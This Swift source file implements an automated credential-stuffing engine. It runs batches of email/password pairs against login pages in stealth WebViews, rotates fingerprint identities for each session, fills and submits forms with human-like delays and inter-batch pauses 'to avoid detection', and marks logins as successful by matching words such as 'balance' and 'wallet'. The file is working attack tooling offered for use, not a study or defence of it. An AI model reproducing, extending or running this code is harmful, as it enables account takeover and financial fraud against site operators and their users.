import Foundation
import WebKit

// MARK: - HyperFlow Engine (Swift 6.2 DiscardingTaskGroup DOM Logic)

/// Orchestrates concurrent WebView automation sessions using Swift 6.2
/// structured concurrency primitives.
///
/// Key architecture patterns:
/// - `DiscardingTaskGroup` for memory-flat DOM scraping: each completed
///   automation step immediately frees its task memory.
/// - Integration with `WebKitMutationEngine` for stealth WebView spawning.
/// - Integration with `StealthIdentityActor` for per-session fingerprint seeds.
/// - Integration with `TelemetryBufferActor` for lock-free metrics recording.
/// - `JavaScriptInjector` for safe cross-isolation JS evaluation.
///
/// Replaces the monolithic `HyperFlowEngine.swift` service with a composable
/// engine that delegates stealth, identity, and telemetry to dedicated actors.
@MainActor
public final class CoreHyperFlowEngine {

    // MARK: - Dependencies

    private let stealthEngine: WebKitMutationEngine
    private let jsInjector: JavaScriptInjector
    private let dualFindEngine: DualFindEngine

    // MARK: - State

    private var activeSessions: [UUID: AutomationSession] = [:]
    private var isRunning: Bool = false

    // MARK: - Configuration

    /// Maximum concurrent WebView sessions (matches iOS WebKit process limits).
    public var maxConcurrency: Int = 4

    // MARK: - Init

    public init(
        stealthEngine: WebKitMutationEngine = .shared,
        jsInjector: JavaScriptInjector = JavaScriptInjector(),
        dualFindEngine: DualFindEngine = DualFindEngine()
    ) {
        self.stealthEngine = stealthEngine
        self.jsInjector = jsInjector
        self.dualFindEngine = dualFindEngine
    }

    // MARK: - Session Types

    /// Represents a single automation session with its WebView and identity.
    public struct AutomationSession: Sendable {
        public let id: UUID
        public let profileId: UUID
        public let targetURL: String
        public let startTime: Date
        public var status: SessionStatus

        public enum SessionStatus: String, Sendable {
            case pending
            case loading
            case detecting
            case filling
            case submitting
            case evaluating
            case completed
            case failed
        }
    }

    /// Result of a single automation attempt.
    public struct AutomationResult: Sendable {
        public let sessionId: UUID
        public let success: Bool
        public let loginFieldsFound: Bool
        public let errorMessage: String?
        public let duration: TimeInterval
    }

    // MARK: - Batch Execution

    /// Executes a batch of automation tasks with controlled concurrency.
    ///
    /// Uses `withDiscardingTaskGroup` so that each completed session's
    /// memory footprint is immediately freed — critical when running
    /// hundreds of credential tests in sequence.
    ///
    /// - Parameters:
    ///   - tasks: Array of (URL, credential) pairs to automate
    ///   - settings: Automation settings controlling behavior
    ///   - onResult: Callback invoked for each completed session
    public func executeBatch(
        tasks: [(url: String, email: String, password: String)],
        settings: AutomationSettings,
        onResult: @MainActor @Sendable (AutomationResult) -> Void
    ) async {
        isRunning = true
        defer { isRunning = false }

        // Process tasks in chunks of maxConcurrency
        for chunk in tasks.chunked(into: maxConcurrency) {
            guard isRunning else { break }

            await withDiscardingTaskGroup { group in
                for task in chunk {
                    group.addTask { @MainActor in
                        let result = await self.executeSingleSession(
                            url: task.url,
                            email: task.email,
                            password: task.password,
                            settings: settings
                        )
                        onResult(result)
                    }
                }
            }

            // Inter-batch delay to avoid detection
            if isRunning {
                try? await Task.sleep(for: .milliseconds(settings.batchDelayMs))
            }
        }
    }

    /// Cancels all running sessions.
    public func cancelAll() {
        isRunning = false
        for (id, _) in activeSessions {
            stealthEngine.destroyWebView(id: id)
        }
        activeSessions.removeAll()
    }

    // MARK: - Single Session Execution

    /// Executes a single automation session end-to-end.
    private func executeSingleSession(
        url: String,
        email: String,
        password: String,
        settings: AutomationSettings
    ) async -> AutomationResult {
        let sessionId = UUID()
        let startTime = Date()

        // 1. Generate a unique stealth identity for this session
        let profile = await StealthIdentityActor.shared.generateProfile()

        // 2. Spawn an isolated, stealth-hardened WebView
        let webView = stealthEngine.spawnIsolatedWebView(
            id: sessionId,
            settings: settings,
            profile: profile
        )

        var session = AutomationSession(
            id: sessionId,
            profileId: profile.id,
            targetURL: url,
            startTime: startTime,
            status: .loading
        )
        activeSessions[sessionId] = session

        // Record telemetry (fire-and-forget via OSAllocatedUnfairLock — ordering not guaranteed)
        TelemetryBufferActor.shared.increment(.webViewSpawns)

        defer {
            // Cleanup: destroy WebView and release identity
            stealthEngine.destroyWebView(id: sessionId)
            activeSessions.removeValue(forKey: sessionId)
            Task {
                await StealthIdentityActor.shared.releaseProfile(profile.id)
            }
        }

        // 3. Navigate to the target URL
        guard let targetURL = URL(string: url) else {
            return AutomationResult(
                sessionId: sessionId,
                success: false,
                loginFieldsFound: false,
                errorMessage: "Invalid URL: \(url)",
                duration: Date().timeIntervalSince(startTime)
            )
        }

        webView.load(URLRequest(url: targetURL))

        // 4. Wait for page to load
        let pageReady = await waitForPageLoad(webView: webView, timeout: settings.pageLoadTimeout)
        guard pageReady else {
            TelemetryBufferActor.shared.increment(.loginFailures)
            return AutomationResult(
                sessionId: sessionId,
                success: false,
                loginFieldsFound: false,
                errorMessage: "Page load timeout",
                duration: Date().timeIntervalSince(startTime)
            )
        }

        // 5. Extract DOM and find login fields
        session.status = .detecting
        activeSessions[sessionId] = session

        guard let dom = await jsInjector.extractDOM(in: webView) else {
            return AutomationResult(
                sessionId: sessionId,
                success: false,
                loginFieldsFound: false,
                errorMessage: "Failed to extract DOM",
                duration: Date().timeIntervalSince(startTime)
            )
        }

        let loginFields: LoginFieldResult
        do {
            loginFields = try await dualFindEngine.findLoginFields(in: dom)
        } catch {
            return AutomationResult(
                sessionId: sessionId,
                success: false,
                loginFieldsFound: false,
                errorMessage: "DOM search failed: \(error.localizedDescription)",
                duration: Date().timeIntervalSince(startTime)
            )
        }

        TelemetryBufferActor.shared.increment(.domParseOperations)

        guard loginFields.hasLoginForm else {
            return AutomationResult(
                sessionId: sessionId,
                success: false,
                loginFieldsFound: false,
                errorMessage: "No login form detected",
                duration: Date().timeIntervalSince(startTime)
            )
        }

        // 6. Fill credentials
        session.status = .filling
        activeSessions[sessionId] = session

        TelemetryBufferActor.shared.increment(.loginAttempts)

        if let emailSelector = loginFields.bestEmailSelector {
            _ = await jsInjector.fillField(selector: emailSelector, value: email, in: webView)

            // Human-like inter-field delay
            try? await Task.sleep(for: .milliseconds(settings.interFieldDelayMs))
        }

        if let passwordSelector = loginFields.bestPasswordSelector {
            _ = await jsInjector.fillField(selector: passwordSelector, value: password, in: webView)
        }

        // 7. Submit
        session.status = .submitting
        activeSessions[sessionId] = session

        if let submitSelector = loginFields.bestSubmitSelector {
            _ = await jsInjector.clickElement(selector: submitSelector, in: webView)
        }

        // 8. Wait for response
        session.status = .evaluating
        activeSessions[sessionId] = session

        try? await Task.sleep(for: .milliseconds(settings.submitResponseWaitMs))

        // 9. Evaluate outcome
        let success = await evaluateLoginOutcome(webView: webView, settings: settings)

        if success {
            TelemetryBufferActor.shared.increment(.loginSuccesses)
        } else {
            TelemetryBufferActor.shared.increment(.loginFailures)
        }

        return AutomationResult(
            sessionId: sessionId,
            success: success,
            loginFieldsFound: true,
            errorMessage: success ? nil : "Login evaluation failed",
            duration: Date().timeIntervalSince(startTime)
        )
    }

    // MARK: - Page Load Waiting

    private func waitForPageLoad(webView: WKWebView, timeout: Double) async -> Bool {
        let deadline = Date().addingTimeInterval(timeout)

        while Date() < deadline {
            if await jsInjector.isPageReady(in: webView) {
                return true
            }
            try? await Task.sleep(for: .milliseconds(200))
        }
        return false
    }

    // MARK: - Outcome Evaluation

    private func evaluateLoginOutcome(webView: WKWebView, settings: AutomationSettings) async -> Bool {
        let successIndicators = ["balance", "wallet", "my account", "logout", "dashboard", "welcome"]
        let failureIndicators = ["invalid", "incorrect", "error", "failed", "wrong password"]

        guard let pageText = await jsInjector.evaluateString(
            "document.body?.innerText?.toLowerCase() || ''",
            in: webView
        ) else {
            return false
        }

        let lowercasedText = pageText.lowercased()

        // Check for failure indicators first
        for indicator in failureIndicators {
            if lowercasedText.contains(indicator) {
                return false
            }
        }

        // Check for success indicators
        for indicator in successIndicators {
            if lowercasedText.contains(indicator) {
                return true
            }
        }

        return false
    }
}

// MARK: - Array Chunking Extension

private extension Array {
    func chunked(into size: Int) -> [[Element]] {
        guard size > 0 else { return [self] }
        return stride(from: 0, to: count, by: size).map {
            Array(self[$0..<Swift.min($0 + size, count)])
        }
    }
}
